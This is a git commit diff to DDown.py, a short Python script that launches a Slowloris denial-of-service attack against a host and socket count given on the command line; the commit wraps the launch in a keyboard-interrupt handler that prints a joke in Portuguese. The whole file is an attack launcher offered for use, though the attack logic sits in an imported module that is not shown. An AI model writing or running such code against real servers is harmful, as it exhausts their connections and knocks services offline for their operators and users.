c975e10a0b1843de285f5dd60f055781c143675a
atl4sl4b <atl4s.l4b@gmail.com>
2023-08-07 04:11:26 +0000

    Detalhes

--- DDown.py
+++ DDown.py
@@ -4,12 +4,16 @@ import rich, sys
 from lib import HostAddress, SlowLorisAttack
 from lib import logo
 
-
-url = HostAddress.from_url(f"http://{sys.argv[1]}")
-sockets_c = int(sys.argv[2])
-
-
-dd_attack = SlowLorisAttack(url, sockets_c, silent=True)
+try:
+  url = HostAddress.from_url(f"http://{sys.argv[1]}")
+  sockets_c = int(sys.argv[2])
 
 
-dd_attack.start()
+  dd_attack = SlowLorisAttack(url, sockets_c, silent=True)
+
+
+  dd_attack.start()
+
+except KeyboardInterrupt:
+    print (" Mas já?? :( ")
+    exit(0)
